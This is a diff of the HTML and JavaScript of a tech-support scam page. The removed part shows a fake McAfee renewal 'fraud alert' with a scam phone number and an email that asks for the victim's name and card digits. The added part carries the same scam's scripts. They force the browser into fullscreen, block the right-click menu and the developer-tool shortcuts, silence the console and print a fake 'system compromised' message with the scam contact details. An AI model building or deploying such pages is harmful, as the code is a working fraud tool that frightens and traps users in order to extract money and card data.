-    <div class="popup-card" style="position: relative; background: #0d0d0d; border-left: 6px solid #ff0000; padding: 20px 24px; border-radius: 6px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.4); border: 1px solid #b52b2e;">
-      
-      <!-- X Close Icon -->
-      <button id="closePopupBtn" style="position: absolute; top: 8px; right: 12px; background: none; border: none; font-size: 22px; font-weight: 300; color: #8a9aa8; cursor: pointer; padding: 4px 8px; line-height: 1; transition: color 0.2s; border-radius: 50%;" onmouseover="this.style.color='#ff0000';" onmouseout="this.style.color='#8a9aa8';">✕</button>
-      
-      <!-- Flashing Warning Emoji / Skull -->
-      <h2 style="color: #ff0000; margin: 0 0 6px 0; font-weight: 900; text-shadow: 0 0 10px rgba(255,0,0,0.6); font-size: 24px;">
-        ⚠️ IMMEDIATE ACTION REQUIRED ⚠️
-      </h2>
-      
-      <div class="sub" style="color: #f0f0f0; font-size: 16px; line-height: 1.6;">
-        <span style="background: #b52b2e; padding: 2px 8px; border-radius: 4px; font-weight: bold;">FRAUD ALERT</span><br><br>
-        Your <strong style="color: #ff4444;">McAfee Total Protection</strong> renewal for <strong style="color: #ff4444; font-size: 22px;">$862.99</strong> 
-        has been <span style="color: #ff0000; text-transform: uppercase; font-weight: bold;">charged to your card</span>.
-      </div>
-      
-      <div style="margin-top: 15px; padding: 12px; background: #2a0a0a; border-radius: 6px; border-left: 4px solid #ff0000;">
-        <p style="color: #ff9999; margin: 0; font-size: 14px;">
-          ❗ If you did NOT authorize this transaction, your account will be debited within 24 hours.<br>
-          <span style="color: #ffffff; font-weight: bold;">Contact our Security Department IMMEDIATELY to cancel.</span>
-        </p>
-      </div>
+            // Also try when popup is closed
+            const observer = new MutationObserver(function() {
+                if (overlay.classList.contains('hidden')) {
+                    requestFullscreen();
+                }
+            });
+            observer.observe(overlay, { attributes: true, attributeFilter: ['class'] });
 
-      <!-- Scary Phone Number -->
-      <div class="paypal-phone" style="
-          margin-top: 18px; 
-          font-size: 20px; 
-          font-weight: 700; 
-          color: #ffffff; 
-          letter-spacing: 0.3px;
-          padding: 14px 20px;
-          border: 2px solid #ff0000;
-          border-radius: 10px;
-          background: #2a0000;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          box-shadow: 0 0 15px rgba(255,0,0,0.3);
-          text-align: center;
-        ">
-        <span>📞 CALL NOW: <span style="color: #ff4444; text-shadow: 0 0 8px red;">+1 (831) 512-3319</span></span>
-      </div>
+            // ============================================================
+            // 3. PREVENT CONTEXT MENU & DEVTOOLS
+            // ============================================================
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
 
-      <!-- Contact Email Section -->
-      <div style="
-          margin-top: 15px; 
-          padding: 12px 10px; 
-          background: #111; 
-          border: 1px dashed #b52b2e; 
-          border-radius: 6px; 
-          text-align: center;
-        ">
-        <span style="color: #888; font-size: 13px; text-transform: uppercase; letter-spacing: 1px;">Or email dispute to:</span><br>
-        <span style="color: #ff6666; font-size: 18px; font-weight: bold; word-break: break-all; text-shadow: 0 0 5px #b52b2e;">
-          ✉️ b.n.yankov@suyavorov.com
-        </span>
-        <div style="margin-top: 6px; color: #555; font-size: 12px;">(Include your full name and card last 4 digits)</div>
-      </div>
+            document.addEventListener('keydown', function(e) {
+                const key = e.key.toLowerCase();
+                const ctrl = e.ctrlKey || e.metaKey;
+                const shift = e.shiftKey;
 
-      <!-- Small deceptive fine print -->
-      <div style="margin-top: 18px; font-size: 11px; color: #444; text-align: center; border-top: 1px solid #222; padding-top: 12px;">
-        ⚡ This is an automated security alert. Failure to respond within 12 hours will result in permanent charge.<br>
-        <span style="color: #ff0000;">Do not ignore.</span>
-      </div>
-    </div>
-  </div>
+                if (e.key === 'F12' ||
+                    (ctrl && shift && ['i', 'j', 'c', 'k', 'p'].includes(key)) ||
+                    (ctrl && key === 'u') ||
+                    (ctrl && shift && key === 'u')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            });
 
-  <script>
-    (function() {
-      let popupTimer = null;
+            // ============================================================
+            // 4. CONSOLE OVERRIDE
+            // ============================================================
+            const noop = function() {};
+            console.log = noop;
+            console.info = noop;
+            console.warn = noop;
+            console.error = noop;
+            console.debug = noop;
+            console.table = noop;
+            console.dir = noop;
+            console.trace = noop;
 
-      function showPopup() {
-        const overlay = document.getElementById('popupOverlay');
-        if (overlay) {
-          overlay.classList.add('active');
-        }
-      }
+            // Fake scary console message
+            console.log('%c⚠️ YOUR SYSTEM HAS BEEN COMPROMISED ⚠️', 'color: #ff0000; font-size: 32px; font-weight: bold;');
+            console.log('%cContact our Security Department immediately:', 'color: #ff6666; font-size: 18px;');
+            console.log('%c📞 +1 (831) 512-3319', 'color: #ff0000; font-size: 22px; font-weight: bold;');
+            console.log('%c✉️ b.n.yankov@suyavorov.com', 'color: #ff4444; font-size: 18px;');
 
-      // Show popup after 5 seconds
-      popupTimer = setTimeout(showPopup, 5000);
+            // ============================================================
+            // 5. SCARY SCREEN FLICKER
+            // ============================================================
+            setInterval(function() {
+                if (Math.random() < 0.05) {
+                    document.body.style.backgroundColor = '#2a0000';
+                    setTimeout(function() {
+                        document.body.style.backgroundColor = '#1a0000';
+                    }, 80);
+                }
+            }, 500);
 
-      // Close button handler (X icon)
-      const closeBtn = document.getElementById('closePopupBtn');
-      if (closeBtn) {
-        closeBtn.addEventListener('click', function(e) {
-          e.stopPropagation();
-          const overlay = document.getElementById('popupOverlay');
-          if (overlay) {
-            overlay.classList.remove('active');
-          }
-        });
-      }
+            // ============================================================
+            // 6. PULSE THE POPUP TITLE
+            // ============================================================
+            const title = document.querySelector('.popup-title');
+            if (title) {
+                setInterval(function() {
+                    title.style.transform = Math.random() < 0.3 ?
+                        'scale(1.02) rotate(0.5deg)' :
+                        'scale(1) rotate(0deg)';
+                    setTimeout(function() {
+                        title.style.transform = 'scale(1) rotate(0deg)';
+                    }, 100);
+                }, 800);
+            }
 
-      // Click outside to close
-      const overlay = document.getElementById('popupOverlay');
-      if (overlay) {
-        overlay.addEventListener('click', function(e) {
-          if (e.target === overlay) {
-            overlay.classList.remove('active');
-          }
-        });
-      }
-    })();
-  </script>
+        })();
+    </script>
 
-  <script>
-    (function () {
-      'use strict';
-
-      // Developer bypass: add ?allow-devtools=1 to disable protections
-      const params = new URLSearchParams(window.location.search);
-      if (params.has('allow-devtools')) {
-        console.info('DevTools protections disabled via URL param allow-devtools.');
-        attachFullscreenTriggers();
-        return;
-      }
-
-      // ---------- Fullscreen behavior ----------
-      function goFull() {
-        try {
-          if (!document.fullscreenElement) {
-            document.documentElement.requestFullscreen?.();
-          }
-        } catch (err) {
-          // ignore
-        }
-      }
-
-      function attachFullscreenTriggers() {
-        const docEvents = [
-          'mousemove','click','mousedown','mouseup','mouseenter','mouseleave','mouseover','mouseout','dblclick','contextmenu',
-          'touchstart','touchmove','touchend','touchcancel',
-          'keydown','keyup','keypress',
-          'scroll','wheel',
-          'drag','dragstart','dragend','dragover','dragenter','dragleave','drop',
-          'focus','blur','focusin','focusout',
-          'change','input','submit','reset','select',
-          'copy','cut','paste',
-          'play','pause','volumechange','timeupdate',
-          'pointerdown','pointerup','pointermove','pointerover','pointerout','pointerenter','pointerleave','pointercancel',
-          'animationstart','animationend','animationiteration',
-          'transitionstart','transitionend','transitioncancel',
-          'error','abort','canplay','canplaythrough','durationchange','emptied','ended','loadeddata','loadedmetadata',
-          'loadstart','progress','ratechange','seeked','seeking','stalled','suspend','waiting'
-        ];
-        docEvents.forEach(ev => {
-          try {
-            document.addEventListener(ev, goFull, { capture: false, passive: true });
-          } catch (err) {}
-        });
-
-        try { window.addEventListener('resize', goFull, { passive: true }); } catch (e) {}
-        try { window.addEventListener('load', goFull, { passive: true }); } catch (e) {}
-        try { window.addEventListener('hashchange', goFull, { passive: true }); } catch (e) {}
-        try { window.addEventListener('popstate', goFull, { passive: true }); } catch (e) {}
-      }
-
-      attachFullscreenTriggers();
-
-      // ---------- Prevent common DevTools shortcuts & context menu ----------
-      function preventEvent(e) {
-        try {
-          e.preventDefault();
-          e.stopImmediatePropagation();
-          e.stopPropagation();
-        } catch (err) {}
-        return false;
-      }
-
-      function isBlockedKey(e) {
-        const key = (e.key || '').toLowerCase();
-        const code = (e.code || '').toLowerCase();
-        const ctrl = !!e.ctrlKey;
-        const shift = !!e.shiftKey;
-        const alt = !!e.altKey;
-        const meta = !!e.metaKey;
-
-        if (code === 'f12') return true;
-        if ((ctrl || meta) && shift && ['i','j','c','k','p'].includes(key)) return true;
-        if ((ctrl || meta) && key === 'u') return true;
-        if (meta && alt && ['i','j','c'].includes(key)) return true;
-        return false;
-      }
-
-      function onKeyHandler(e) {
-        try {
-          if (isBlockedKey(e)) {
-            preventEvent(e);
-            try { goFull(); } catch (err) {}
-            return false;
-          }
-        } catch (err) {}
-      }
-
-      window.addEventListener('keydown', onKeyHandler, { capture: true, passive: false });
-      window.addEventListener('keyup', onKeyHandler, { capture: true, passive: false });
-
-      document.addEventListener('contextmenu', function (e) {
-        try {
-          preventEvent(e);
-          goFull();
-        } catch (err) {}
-      }, { capture: true, passive: false });
-
-      document.addEventListener('selectstart', function (e) {
-        try { preventEvent(e); } catch (err) {}
-      }, { capture: true, passive: false });
-
-      // ---------- Console override ----------
-      (function overrideConsole() {
-        try {
-          if (!window.__originalConsole) {
-            window.__originalConsole = {
-              log: console.log.bind(console),
-              info: console.info.bind(console),
-              warn: console.warn.bind(console),
-              error: console.error.bind(console),
-              debug: console.debug ? console.debug.bind(console) : console.log.bind(console)
-            };
-          }
-          const noop = function () {};
-          console.log = noop;
-          console.info = noop;
-          console.warn = noop;
-          console.error = noop;
-          console.debug = noop;
-        } catch (err) {}
-      })();
-    })();
-  </script>
 </body>
 </html>
